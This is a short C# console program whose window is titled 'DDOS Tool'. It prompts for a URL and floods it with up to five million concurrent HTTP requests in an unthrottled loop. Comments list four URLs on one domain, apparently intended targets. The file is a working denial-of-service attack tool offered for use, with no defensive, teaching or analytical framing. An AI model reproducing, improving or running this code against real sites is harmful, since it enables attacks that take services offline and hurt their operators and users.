using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp2
{
	class Program
	{
		// "https://cyberxecomp.com/Content/js/jquery-ui.min.js"
		// "https://cyberxecomp.com/e26051d.js"
		// "https://cyberxecomp.com/9tvm8m4bkgt7/t7g8cbxtxg"
		// "https://cyberxecomp.com/Content/css/jquery-ui.css"

		private static void Main()
		{
			Console.Title = "DDOS Tool";
			Console.Clear();
			Console.WriteLine("Insert URL:");
			string url = Console.ReadLine();
			Loop(url);
			Thread.Sleep(-1);
		}

		private async static void Loop(string url)
		{
			using (WebClient checkUrlClient = new WebClient())
			{
				try
				{
					checkUrlClient.OpenRead(new Uri(url));
					Console.Clear();
				}
				catch
				{
					Console.WriteLine("**X**   Invalid URL.   **X**");
					Console.ReadKey();
					Main();
				}
			}

			int i = 0;
			while (true)
			{
				WebClient c = new WebClient();
				await Task.Run(() =>
				{
					Task.Run(() =>
					{
						try
						{
							c.OpenRead(new Uri(url));
						}
						catch (Exception e)
						{
							Console.WriteLine(e.Message);
						}
					});
					Console.WriteLine($"[ #{i} ]   Loaded");
				});

				i++;
				if (i % 5000 == 0)
				{
					Console.Clear();
				}
				if (i > 5000000)
				{
					Environment.Exit(0);
				}
			}
		}
	}
}
